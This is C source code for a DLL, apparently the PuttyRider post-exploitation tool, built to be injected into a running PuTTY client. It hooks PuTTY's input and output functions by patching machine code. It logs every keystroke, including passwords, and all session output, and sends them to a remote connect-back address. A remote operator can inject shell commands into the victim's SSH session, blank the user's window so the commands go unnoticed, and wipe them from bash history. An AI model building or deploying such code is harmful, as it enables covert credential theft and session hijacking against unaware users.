#include <windows.h>
#include "Utils.h"

/* This named data section will be shared between multiple instances of this DLL
 * Its purpose is to pass the parameters from PuttyRider.exe to the DLL instance running inside Putty.exe
 * In order to be shared, it needs to be loaded by PuttyRider.exe also
 */
#pragma data_seg(".shared")
    UCHAR   connectBackIP[BUFSIZE]  = "";
    UINT    connectBackPort         = 0;
    UCHAR   logFileName[MAX_PATH]   = "";
    UCHAR   defaultCmd[MAX_PATH]    = "";
#pragma data_seg()
#pragma comment(linker, "/section:.shared,RWS")

/* Disable compiler warning: C4731 frame pointer register modified
 */
#pragma warning(disable : 4731)

/* The hex representation of signatures must be less than 200 characters (100 bytes)
 * The hex representation of signatures must have an even length 
 */
#define LDISC_SEND_SIGN1    "515355568b742414578b7c242033ed3bfd896c2410"    /* Matches ldisc_send() in Putty 0.54 - 0.63  */
#define TERM_DATA_SIGN1     "56ff7424148b74240cff7424148d466050e8"          /* Matches term_data()  in Putty 0.54 - 0.56  */
#define TERM_DATA_SIGN2     "56ff7424148b74240cff7424148d464c50e8"          /* Matches term_data()  in Putty 0.57         */
#define TERM_DATA_SIGN3     "568b742408ff7424148d464cff74241450e8"          /* Matches term_data()  in Putty 0.58 - 0.63  */

DWORD   pLdiscSend;             /* The address of ldisc_send() in .text section of Putty.exe */
DWORD   pTermData;              /* The address of term_data()  in .text section of Putty.exe */

UCHAR   ldiscSendBytes[9];      /* First 9 bytes of function ldisc_send() */
UCHAR   termDataBytes[9];       /* First 9 bytes of function term_data() */

DWORD   oldEIPLdiscSend;
DWORD   oldEIPTermData;

DWORD   processID;                      /* Current process ID */
FILE*   logFd;                          /* FILE object that identifies the output file */
HANDLE  logPipe;                        /* Handler of a named pipe used for sending log messages to the initial process */
UCHAR   buffer[BUFSIZE];                /* General buffer to keep temporary data */
UCHAR   keyPressBuf[BUFSIZE];           /* Stores user input received in ldisc_send() */
BOOL    connInfoSent        = FALSE;    /* This flag says if connection information has already been sent or not */
BOOL    outputDisabled      = FALSE;    /* If output is disabled, the Putty window will not display anything */
INT     outputDisabledCount;            /* When disabling output, this is the number of times term_data() is not called 
                                         * For instance, for not showing one shell command, term_data() must be skipped 2 times
                                         */
BOOL    bDefaultCmdExecuted = FALSE;    /* Ensure that the default command is executed only once */
BOOL    bEjectDLL           = FALSE;    /* This signals that the DLL should be unloaded */
SOCKET  gsock             = 0;          /* Socket for reverse connection */

VOID*   ldiscSendHandleParam = 0;       /* This is the first parameter that is passed to ldisc_send() by putty 
                                         * Ldisc ldisc = (Ldisc) handle;
                                         */
BOOL    bPuttyWindowConnected   = TRUE;

/* Prototypes of function handlers that will be called after hooking the target functions 
 */
VOID     LdiscSendHandler(VOID* handle, CHAR* buf, INT len, INT interactive);
INT     TermDataHandler(VOID* term, INT is_stderr, CHAR* data, INT len);


/* Helper functions for enabling/disabling Putty output */
VOID DisablePuttyOutput()
{
    outputDisabled          = TRUE;
    outputDisabledCount     = 3;    /* Skip term_data() x times */
}
VOID EnablePuttyOutput()
{
    outputDisabled = FALSE;
}

/* Finds the pointers to target functions by searching their patterns in the .text section of the current module
 */
BOOL FindTargetFunctions(DWORD* pLdiscSend, DWORD* pTermData)
{
    UCHAR   modulePath[MAX_PATH];
    DWORD   moduleBaseAddress;
    DWORD   textSectionAddress;
    DWORD   textSectionSize;
    DWORD   numBytes;

    GetModuleFileName(NULL, modulePath, MAX_PATH);
    sprintf(buffer, "[+] [%i] Target path: %s\n", processID, modulePath);
    WritePipeMessage(logPipe, buffer);    

    moduleBaseAddress = GetModuleBaseAddress();
    if(GetTextSection(modulePath, &textSectionAddress, &textSectionSize) == FALSE) {
        sprintf(buffer, "[-] [%i] %s\n", processID, "Could not find .text section\n");
        WritePipeMessage(logPipe, buffer);
        return FALSE;
    } else {
        sprintf(buffer, "[+] [%i] Base address: %08x\n", processID, moduleBaseAddress);
        WritePipeMessage(logPipe, buffer);
        sprintf(buffer, "[+] [%i] .text start address: %08x\n", processID, textSectionAddress);
        WritePipeMessage(logPipe, buffer);
        sprintf(buffer, "[+] [%i] .text size: %08x\n", processID, textSectionSize);
        WritePipeMessage(logPipe, buffer);
    }
    
    /* Find ldisc_send() address in .text section of Putty.exe */
    HexStringToBytes(LDISC_SEND_SIGN1, buffer);    
    *pLdiscSend = (DWORD)memmem((const unsigned char*)(moduleBaseAddress + textSectionAddress), textSectionSize, 
                                (const unsigned char*)buffer, strlen(LDISC_SEND_SIGN1) / 2);
    if (*pLdiscSend == 0) {
        sprintf(buffer, "[-] [%i] %s\n", processID, "Could not find ldisc_send()\n");
        WritePipeMessage(logPipe, buffer);
        return FALSE;
    }    
    
    /* Find term_data() address in .text section of Putty.exe */
    /* Try all signatures */
    HexStringToBytes(TERM_DATA_SIGN1, buffer);    
    *pTermData = (DWORD)memmem((const unsigned char*)(moduleBaseAddress + textSectionAddress), textSectionSize, 
                                (const unsigned char*)buffer, strlen(TERM_DATA_SIGN1) / 2);
    if (*pTermData == 0) {
        HexStringToBytes(TERM_DATA_SIGN2, buffer);    
        *pTermData = (DWORD)memmem((const unsigned char*)(moduleBaseAddress + textSectionAddress), textSectionSize, 
                                    (const unsigned char*)buffer, strlen(TERM_DATA_SIGN2) / 2);
        if (*pTermData == 0) {
            HexStringToBytes(TERM_DATA_SIGN3, buffer);    
            *pTermData = (DWORD)memmem((const unsigned char*)(moduleBaseAddress + textSectionAddress), textSectionSize, 
                                        (const unsigned char*)buffer, strlen(TERM_DATA_SIGN3) / 2);
            if (*pTermData == 0) {
                sprintf(buffer, "[-] [%i] %s\n", processID, "Could not find term_data()\n");
                WritePipeMessage(logPipe, buffer);
                return FALSE;
            }
        }
    }
    
    return TRUE;
}

/* Write a sequence of opcodes at pLocation that will determine a jump to pJmpAddr:
 * XOR EAX, EAX; ADD EAX pJmpAddr; JMP EAX
 */
VOID WriteJmpToAddress(DWORD pLocation, DWORD pJmpAddr)
{
    #define XOR_EAX_EAX     "31c0"
    #define JMP_EAX         "ffe0"

    CHAR    jmpAddrStr[9];
    CHAR    opcodeStr[200];
    UINT    pos = 0;
    UINT    j;
    UCHAR   xbyte;
    
    memset(opcodeStr, 0, 200);
    sprintf(jmpAddrStr, "%08x", pJmpAddr);
    
    strcat(opcodeStr, XOR_EAX_EAX);
    strcat(opcodeStr, "05");           // ADD EAX, ...
    /* Append jmp address bytes in reverse order */
    strcat(opcodeStr, jmpAddrStr+6); 
    jmpAddrStr[6] = 0;
    strcat(opcodeStr, jmpAddrStr+4); 
    jmpAddrStr[4] = 0;
    strcat(opcodeStr, jmpAddrStr+2); 
    jmpAddrStr[2] = 0;
    strcat(opcodeStr, jmpAddrStr); 
    strcat(opcodeStr, JMP_EAX);
    
    /* Transform string opcodes to bytes and write them to location */
    for (j = 0; j < (strlen(opcodeStr) / 2); j++) {
        sscanf(opcodeStr + 2*j, "%02x", &xbyte);
        ((UCHAR*)pLocation)[pos++] = xbyte;
    }
}

/* This function installs both hooks for the first time into the target functions
 */
BOOL InstallHooks()
{
    INT i;
    
    /* Save the first 9 bytes from the beginning of the target functions because they will be overwritten with JMPs */
    for(i = 0; i < 9; i++) {
        ldiscSendBytes[i]     = ((UCHAR*)pLdiscSend)[i];
        termDataBytes[i]    = ((UCHAR*)pTermData)[i];
    }

    /* Change the access rights of memory regions of target functions */
    if (VirtualProtect((UCHAR*)pLdiscSend, 20, PAGE_EXECUTE_READWRITE, &i) == 0) {
        sprintf(buffer, "[-] [%i] %s\n", processID, "VirtualProtect failed\n");
        WritePipeMessage(logPipe, buffer);
        return FALSE;
    }
    if (VirtualProtect((UCHAR*)pTermData, 20, PAGE_EXECUTE_READWRITE, &i) == 0) {
        sprintf(buffer, "[-] [%i] %s\n", processID, "VirtualProtect failed\n");
        WritePipeMessage(logPipe, buffer);
        return FALSE;
    }
    
    WriteJmpToAddress(pLdiscSend, (DWORD)LdiscSendHandler);
    WriteJmpToAddress(pTermData, (DWORD)TermDataHandler);    
    
    return TRUE;
}


/* After the original function has executed, reinsert hook (jmp) into the function code and give back control to original program 
 */
VOID ReinstallHookLdiscSend()
{
    INT* thisOldEIP;
    
    /* Save the result returned by previous function */
    __asm push eax;     
    
    /* Reinsert hook */
    WriteJmpToAddress(pLdiscSend, (DWORD)LdiscSendHandler);
    
    /* Make the function return back to the original location (to legitimate code) */
    __asm {
        mov thisOldEIP, ebp;  /* This is the location where old EIP must be placed for this function */
    
        push eax;
        push ebx;
        push ecx;
        
        mov ebx, thisOldEIP;
        mov ecx, oldEIPLdiscSend;

        /* EBP must be lifted 4 bytes on stack, oldEIPLdiscSend must be inserted in the initial place of EBP */
        sub ebp, 4;
        mov eax, [ebp+4];
        mov [ebp], eax;
        mov [ebx], ecx;
        
        pop ecx;
        pop ebx;
        pop eax;
    }
    
    /* Restore the result returned by previous function */
    __asm pop eax;  
}


/* After the original function has executed, reinsert hook (jmp) into the function code and give back control to original program 
 */
VOID ReinstallHookTermData()
{
    INT* thisOldEIP;
    
    /* Save the result returned by previous function */
    __asm push eax;     
    
    /* Reinsert hook */
    WriteJmpToAddress(pTermData, (DWORD)TermDataHandler);
    
    /* Make the function return back to the original location (to legitimate code) */
    __asm {
        mov thisOldEIP, ebp;  /* This is the location where old EIP must be placed for this function */
    
        push eax;
        push ebx;
        push ecx;
        
        mov ebx, thisOldEIP;
        mov ecx, oldEIPTermData;

        /* EBP must be lifted 4 bytes on stack, oldEIPTermData must be inserted in the initial place of EBP */
        sub ebp, 4;
        mov eax, [ebp+4];
        mov [ebp], eax;
        mov [ebx], ecx;
        
        pop ecx;
        pop ebx;
        pop eax;
    }
    
    /* Restore the result returned by previous function */
    __asm pop eax;  
}

/* This is the handler function that is called after hooking ldisc_send()
 * Original function declaration is:
 * - void ldisc_send(void *handle, char *buf, int len, int interactive)
 * The original function handles input (key presses) sent by the user in the main Putty window
 */
VOID LdiscSendHandler(VOID* handle, CHAR* buf, INT len, INT interactive)
{
    INT     i;
    UCHAR   c;
    UCHAR*  ptr;
    INT     actualLen;
    INT*    oldEIPAddr;
    VOID    (*ldisc_send)(VOID*, CHAR*, INT, INT);

    /* Save old EIP of original function to oldEIPLdiscSend */
    __asm mov oldEIPAddr, EBP;
    oldEIPAddr += 1;              /* oldEIPAddr += 1 * sizeof(int*) */
    oldEIPLdiscSend = (DWORD)*oldEIPAddr;
    
    if (bEjectDLL == FALSE) {
        /* Replace old EIP with a pointer to our code which will reinstall the hook */
        *oldEIPAddr = (DWORD)ReinstallHookLdiscSend;
    }
    /* Restore original function bytes in order to be usable */
    for(i = 0; i < 9; i++) {
        ((UCHAR*)pLdiscSend)[i] = ldiscSendBytes[i];
    }
    
    /* Save the handle so we can use it in our own thread */
    ldiscSendHandleParam = handle;

    /* If we reach here having our buffer with data, it means that it has not been echoed by the server (ex. password) 
     * So we must process this data also
     */
    if (strlen(keyPressBuf) > 0) {
        if (strlen(logFileName) > 0) {
            fwrite(keyPressBuf, strlen(keyPressBuf), 1, logFd);
        }
        if (gsock > 0) {
            send(gsock, keyPressBuf, strlen(keyPressBuf), 0);
        }
        sprintf(buffer, "[+] [%i] ldisc_send(): %s\n", processID, keyPressBuf);
        WritePipeMessage(logPipe, buffer);
        
        keyPressBuf[0] = 0;
    }
    
    /* Store input data in keyPressBuf */
    if (len < 0) {    /* From Putty src: Less than zero means null terminated special string */
        actualLen = strlen(buf);
    } else {
        actualLen = len;
    }
    if (actualLen > BUFSIZE - 2) {
        actualLen = BUFSIZE - 2;    /* Leave space for null terminator */
    }
    keyPressBuf[0] = 0;
    memcpy(keyPressBuf, buf, actualLen);
    keyPressBuf[actualLen + 1] = 0;    /* Add null terminator */
    
    /* Call original function */
    ldisc_send = (VOID(*)(VOID*, CHAR*, INT, INT))pLdiscSend;
    if (strlen(defaultCmd) > 0 && bDefaultCmdExecuted == FALSE) {
    
        /* Disable output in the Putty window */
        DisablePuttyOutput();
    
        /* Configure the local history to ignore commands beginning with space */
        sprintf(buffer, " export HISTCONTROL=ignorespace;n=`history|tail -n 1|cut -d ' ' -f 3`;history -d $n;history -w\n");
        ldisc_send(handle, buffer, strlen(buffer), interactive);

        /* Remove trailing spaces and '&' character */
        for (ptr = defaultCmd + strlen(defaultCmd) - 1; ptr != defaultCmd; ptr--) {
            if (*ptr != ' ' && *ptr != '&') {
                break;
            } else {
                *ptr = 0;
            }
        }

        sprintf(buffer, "[+] [%i] Executing command:\n", processID);
        WritePipeMessage(logPipe, buffer);

        /* Prefix all commands with a space in order not to show in history */
        sprintf(buffer, " %s 1>/dev/null 2>/dev/null &\n", defaultCmd);
        ldisc_send(handle, buffer, strlen(buffer), interactive);

        WritePipeMessage(logPipe, "         ");
        WritePipeMessage(logPipe, buffer);
        
        bDefaultCmdExecuted = TRUE;
    } else {
        ldisc_send(handle, buf, len, interactive);
    }
    return;
}

/* This is the handler function that is called after hooking term_data()
 * Original function declaration is:
 * - int term_data(Terminal *term, int is_stderr, const char *data, int len)
 * The original function handles data received from the server side and which should be 
 * displayed in the main Putty window
 */
INT TermDataHandler(VOID* term, INT is_stderr, CHAR* data, INT len)
{
    INT     i;
    INT*    oldEIPAddr;
    INT     (*term_data)(VOID*, INT, CHAR*, INT);
    INT     res;
    CHAR    ipAddr1[BUFSIZE];
    CHAR    ipAddr2[BUFSIZE];
    MIB_TCPROW_OWNER_PID    connInfo;
    
    /* First repair the original function code but 
     * ensure that we can reinstall the hook after its execution 
     */

    /* Save old EIP of original function to oldEIPTermData */
    __asm mov oldEIPAddr, EBP;
    oldEIPAddr += 1;              /* oldEIPAddr += 1 * sizeof(int*) */
    oldEIPTermData = (DWORD)*oldEIPAddr;
    
    if (bEjectDLL == FALSE) {
        /* Replace old EIP with a pointer to our code which will reinstall the hook */
        *oldEIPAddr = (DWORD)ReinstallHookTermData;
    }
    /* Restore original function bytes in order to be usable */
    for(i = 0; i < 9; i++) {
        ((UCHAR*)pTermData)[i] = termDataBytes[i];
    }

    
    /* Do something useful with the data */
    if (len > 0) {
        /* Send connection information first */
        if (connInfoSent == FALSE) {
            if (GetEstablishedConnOfPid(processID, &connInfo) == FALSE) {
                sprintf(buffer, "[-] [%i] Could not get information about established connections\n", processID);
                WritePipeMessage(logPipe, buffer);
            } else {
                IPv4ToString(connInfo.dwLocalAddr, ipAddr1, BUFSIZE);
                sprintf(buffer, "[+] [%i] Local  endpoint: %s:%i\n", processID, ipAddr1, ntohs(connInfo.dwLocalPort));
                WritePipeMessage(logPipe, buffer);
                if (strlen(logFileName) > 0) {
                    fwrite(buffer, strlen(buffer), 1, logFd);
                }
                if (gsock > 0) {
                    send(gsock, buffer, strlen(buffer), 0);
                }

                IPv4ToString(connInfo.dwRemoteAddr, ipAddr2, BUFSIZE);
                sprintf(buffer, "[+] [%i] Remote endpoint: %s:%i\n", processID, ipAddr2, ntohs(connInfo.dwRemotePort));
                WritePipeMessage(logPipe, buffer);
                if (strlen(logFileName) > 0) {
                    fwrite(buffer, strlen(buffer), 1, logFd);
                }
                if (gsock > 0) {
                    send(gsock, buffer, strlen(buffer), 0);
                }
            }
            connInfoSent = TRUE;
        }
        
        if (strlen(logFileName) > 0) { 
            fwrite(data, len, 1, logFd);
        }
        if (gsock > 0) {
            send(gsock, data, len, 0);
        }

        sprintf(buffer, "[+] [%i] term_data(): ", processID);
        if (len > BUFSIZE - 50) {
            strncat(buffer, data, BUFSIZE - 50);
        } else {
            strncat(buffer, data, len);
        }
        strcat(buffer, "\n");
        WritePipeMessage(logPipe, buffer);
        
        /* Discard keyPressBuf because it is already echoed back by the server */
        keyPressBuf[0] = 0;                    
    }
    
    if (outputDisabled == FALSE) {
        if (bPuttyWindowConnected == TRUE) {
            /* Call original function */
            term_data = (INT(*)(VOID*, INT, CHAR*, INT))pTermData;
            res = term_data(term, is_stderr, data, len);
        } else {
            res = 0;
        }
    } else {
        /* Skip calling original term_data() outputDisabledCount times */
        res = 0;
        
        outputDisabledCount--;
        if (outputDisabledCount == 0) {
            EnablePuttyOutput();
        }
    }

    return res;
}

DWORD WINAPI RunSocketThread(LPVOID lpParam)
{
    SOCKET  sock                = (SOCKET)lpParam;
    CHAR    banner[BUFSIZE];
    CHAR    localbuf[BUFSIZE];
    INT     sockAvailableBytes;
    BOOL    bConnectionClosed   = FALSE;
    
    sprintf(banner, "\nPuttyRider v0.1\n===============\n\n");
    sprintf(localbuf, "[+] [%i] Client connected. Putty PID=%i\n", processID, processID);
    strcat(banner, localbuf);
    sprintf(localbuf, "[+] [%i] Type !help for more commands\n", processID);
    strcat(banner, localbuf);
    send(sock, banner, strlen(banner), 0);

    while (bEjectDLL == FALSE) {
        Sleep(10);
            
        sockAvailableBytes = recv(sock, localbuf, BUFSIZE-1, 0);
        if (sockAvailableBytes == 0) {
            bConnectionClosed = TRUE;        /* Connection reset by peer */
            break;
        } else if (sockAvailableBytes == SOCKET_ERROR) {
            if (WSAGetLastError() != WSAEWOULDBLOCK) {
                bConnectionClosed = TRUE;    /* Connection error */
                break;
            }
        } else if (sockAvailableBytes > 0) {
            
            /* Null-terminate the input data */
            localbuf[sockAvailableBytes] = 0;
            
            if (strstr(localbuf, "!help") != 0) {
                sprintf(localbuf,"\
Help commands:\n\
    !status     See if the Putty window is connected to user input\n\
    !discon     Disconnect the main Putty window so it won't display any message\n\
                This is useful to send shell commands without the user's notice\n\
    !recon      Reconnect the Putty window to its normal operation mode\n\
    CMD         Linux shell commands\n\
    !exit       Terminate this connection\n\
    !help       Display help for client connection\n\n", processID
                    );
                send(sock, localbuf, strlen(localbuf), 0);
                continue;
            }        
            if (ldiscSendHandleParam == 0) {
                /* If we do not have a valid handle, we simulate a key press in the Putty window
                 * This will trigger a call to ldisc_send(), from where we obtain a valid ldiscSendHandleParam
                 */
                PressPuttyKey(' ');
                Sleep(200);
            }
            if (ldiscSendHandleParam == 0) {
                /* The previous key press did not work or the Putty session is not actually open */
                sprintf(localbuf, "[-] [%i] Could not interact with Putty (session not open or idle)\n", processID);
                send(sock, localbuf, strlen(localbuf), 0);
            } else {
                /* Check our commands */
                if (strstr(localbuf, "!discon") != 0) {
                    bPuttyWindowConnected = FALSE;
                    sprintf(localbuf, "[+] [%i] Putty window disconnected\n", processID);
                    send(sock, localbuf, strlen(localbuf), 0);
                } else if (strstr(localbuf, "!recon") != 0) {
                    bPuttyWindowConnected = TRUE;
                    sprintf(localbuf, "[+] [%i] Putty window connected\n", processID);
                    send(sock, localbuf, strlen(localbuf), 0);
                } else if (strstr(localbuf, "!exit") != 0) {
                    sprintf(localbuf, "[+] [%i] Closing connection. Bye\n", processID);
                    send(sock, localbuf, strlen(localbuf), 0);
                    break;
                } else if (strstr(localbuf, "!status") != 0) {
                    if (bPuttyWindowConnected == TRUE) {
                        sprintf(localbuf, "[+] [%i] Putty window is connected (receives user input)\n", processID);
                        send(sock, localbuf, strlen(localbuf), 0);                    
                    } else {
                        sprintf(localbuf, "[+] [%i] Putty window is not connected (does not receive user input)\n", processID);
                        send(sock, localbuf, strlen(localbuf), 0);                                        
                    }
                } else {
                    if (bPuttyWindowConnected == TRUE) {
                        sprintf(localbuf, "[-] [%i] You must first disconnect the Putty window (!discon command)\n", processID);
                        send(sock, localbuf, strlen(localbuf), 0);                    
                    } else {
                        LdiscSendHandler(ldiscSendHandleParam, localbuf, strlen(localbuf), 1);
                    }
                }
            }
        }
    }
    
    closesocket(sock);
    return 0;
}

HANDLE StartConnectBack()
{
    WSADATA             wsa;
    SOCKET              sock;
    struct sockaddr_in  serverInfo;
    INT                 count       = 0;
    ULONG               socketMode  = 1;    /* Non-blocking */
    HANDLE              hSocketThread;

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        sprintf(buffer, "[+] [%i] WSAStartup failed\n", processID);
        WritePipeMessage(logPipe, buffer);
        return 0;
    }

    if((sock = socket(AF_INET , SOCK_STREAM , 0)) == INVALID_SOCKET) {
        sprintf(buffer, "[+] [%i] Could not create socket\n", processID);
        WritePipeMessage(logPipe, buffer);
        return 0;
    }

    serverInfo.sin_addr.s_addr  = inet_addr(connectBackIP);
    serverInfo.sin_family       = AF_INET;
    serverInfo.sin_port         = htons(connectBackPort);

    sprintf(buffer, "[+] [%i] Connecting to %s:%i\n", processID, connectBackIP, connectBackPort);
    WritePipeMessage(logPipe, buffer);
    
    /* Try 5 times to connect back */
    while (count++ < 5) {
        if (connect(sock, (struct sockaddr *)&serverInfo, sizeof(serverInfo)) < 0) {
            if (count < 5) {
                sprintf(buffer, "[-] [%i] Could not create socket. Retrying...\n", processID);
            } else {
                sprintf(buffer, "[-] [%i] Could not create socket. \n", processID);
            }
            WritePipeMessage(logPipe, buffer);
            Sleep(1000);
            continue;    
        }
        break;
    }
    
    if (count == 6) {
        sprintf(buffer, "[-] [%i] Reverse connection failed\n", processID);
        WritePipeMessage(logPipe, buffer);
        closesocket(sock);
        return 0;
    }
    
    sprintf(buffer, "[+] [%i] Reverse connection succeeded\n", processID, sock);
    WritePipeMessage(logPipe, buffer);
 
    gsock = sock;
    ioctlsocket(sock, FIONBIO, &socketMode);

    /* Start the socket thread */
    hSocketThread = CreateThread(NULL, 0, RunSocketThread, (VOID*)sock, 0, NULL);
    if (hSocketThread == NULL) {
        sprintf(buffer, "[-] [%i] Error creating socket thread\n", processID);
        WritePipeMessage(logPipe, buffer);
        closesocket(sock);
        return 0;
    }

    return hSocketThread;
}


VOID Start()
{    
    HANDLE      hSocketThread;
    HMODULE     hModule;
    CHAR*       pos;
    
    processID = GetCurrentProcessId();
    
    /* Connect to pipe for sending log messages to main process */
    logPipe = CreateFile("\\\\.\\pipe\\pr_log", GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    /* if logPipe == INVALID_HANDLE_VALUE, WritePipeMessage will fail silently */
    
    if (FindTargetFunctions(&pLdiscSend, &pTermData) == FALSE) {
        /* Here we exit also if the DLL was loaded in another process than Putty.exe */
        CloseHandle(logPipe);
        return;
    }
    sprintf(buffer, "[+] [%i] ldisc_send() found at: %08x\n", processID, pLdiscSend);
    WritePipeMessage(logPipe, buffer);
    sprintf(buffer, "[+] [%i] term_data() found at: %08x\n", processID, pTermData);
    WritePipeMessage(logPipe, buffer);

    /* Create the log file if it was requested */
    if (strlen(logFileName) > 0) {
    
        /* Remove the pid if it already exists in the file name */
        pos = strstr(logFileName, ".log.");
        if (pos != NULL) {
            *(pos+4) = 0;
        }
    
        /* Append .pid to the log file name because multiple Putty processes might be hooked */
        if (strlen(logFileName) < MAX_PATH - 7) {
            sprintf(buffer, ".%i", processID);
            strcat(logFileName, buffer);
        }
        if ((logFd = fopen(logFileName, "w")) == NULL) {
            sprintf(buffer, "[-] [%i] Failed creating log file %s\n", processID, logFileName);
            WritePipeMessage(logPipe, buffer);        
        } else {
            sprintf(buffer, "[+] [%i] Log file created: %s\n", processID, logFileName);
            WritePipeMessage(logPipe, buffer);
        }
    }

    if (strlen(defaultCmd) > 0) {
        sprintf(buffer, "[+] [%i] Default command to execute: %s\n", processID, defaultCmd);
        WritePipeMessage(logPipe, buffer);
    }

    /* Initiate the connect back session */
    if (connectBackPort > 0) {
        hSocketThread = StartConnectBack();
        if (hSocketThread == 0 && strlen(logFileName) == 0) {
            sprintf(buffer, "[-] [%i] No output method available\n", processID);
            WritePipeMessage(logPipe, buffer);
            /* We should eject the DLL here */
        }
    }
    
    /* Clear the buffer containing user input */
    keyPressBuf[0] = 0;     

    /* Install the hooks on the target functions */
    if (InstallHooks() == FALSE) {
        sprintf(buffer, "[-] [%i] %s\n", processID, "InstallHooks failed. Quitting\n");
        WritePipeMessage(logPipe, buffer);
        CloseHandle(logPipe);
        return;
    }
    sprintf(buffer, "[+] [%i] %s\n", processID, "Function hooks installed successfully");
    WritePipeMessage(logPipe, buffer);

    /* Force Putty to execute ldisc_send() function in order to execute the default command */
    if (strlen(defaultCmd) > 0) {
        PressPuttyKey('^');
    }
    
    /* Signal the injector thread that it can exit */
    sprintf(buffer, "!consoledetach ");
    WritePipeMessage(logPipe, buffer);
}

__declspec(dllexport) VOID SetLogFileName(UCHAR* fileName)
{
    strncpy(logFileName, fileName, MAX_PATH);
}

__declspec(dllexport) VOID SetDefaultCmd(UCHAR* cmd)
{
    strncpy(defaultCmd, cmd, MAX_PATH);
}

__declspec(dllexport) VOID SetConnectBackInfo(CHAR* ip, DWORD port)
{
    sprintf(connectBackIP, ip);
    connectBackPort = port;
}

__declspec(dllexport) BOOL EjectDLL(UINT dummy)
{
    /* TODO: Add module name as parameter */
    
    HMODULE     hModule = NULL;
    UCHAR       buf[BUFSIZE];
    INT         i;

    /* Signal the hooked functions to unhook */
    bEjectDLL = TRUE;
    
    /* Wait a few milliseconds for the hooked functions to unhook themselves (bEjectDLL = TRUE) */
    /* The RunSocketThread function should exit also */
    Sleep(500);
    
    /* Restore original function bytes in order to be usable */
    for(i = 0; i < 9; i++) {
        ((UCHAR*)pLdiscSend)[i] = ldiscSendBytes[i];
    }
    for(i = 0; i < 9; i++) {
        ((UCHAR*)pTermData)[i] = termDataBytes[i];
    }
    
    hModule = GetModuleHandle("PuttyRider.dll");
    if (hModule != NULL) {
        FreeLibraryAndExitThread(hModule, 0);
    }
    
    return TRUE;
}


BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD  fdwReason, LPVOID lpReserved)
{
    switch(fdwReason)
    {
        case DLL_PROCESS_ATTACH:
            Start();
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}


